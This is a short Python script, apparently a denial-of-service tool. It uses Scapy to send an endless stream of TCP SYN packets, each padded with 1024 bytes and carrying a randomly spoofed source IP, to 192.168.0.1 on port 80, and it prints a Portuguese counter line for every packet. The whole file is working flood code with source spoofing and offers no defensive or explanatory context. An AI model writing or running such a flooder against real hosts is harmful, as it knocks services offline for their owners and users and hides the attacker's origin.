from scapy.all import *

conf.use_pcap = True
count = 1

def randomIP():
  return f"{random.randint(100, 255)}.{random.randint(100, 255)}.{random.randint(0, 10)}.{random.randint(100, 255)}"

while True:
  
  random_ip = randomIP()
  target_ip = "192.168.0.1"

  ip = IP(dst=target_ip, ttl=10, src=random_ip)

  tcp = TCP(sport=RandShort(), dport=80, flags="S")

  raw = Raw(b"X"*1024)

  p = ip/tcp/raw

  print(f"Requisição: {count}. De: {random_ip} Para: {target_ip}")

  send(p, loop=0, verbose=0)

  count += 1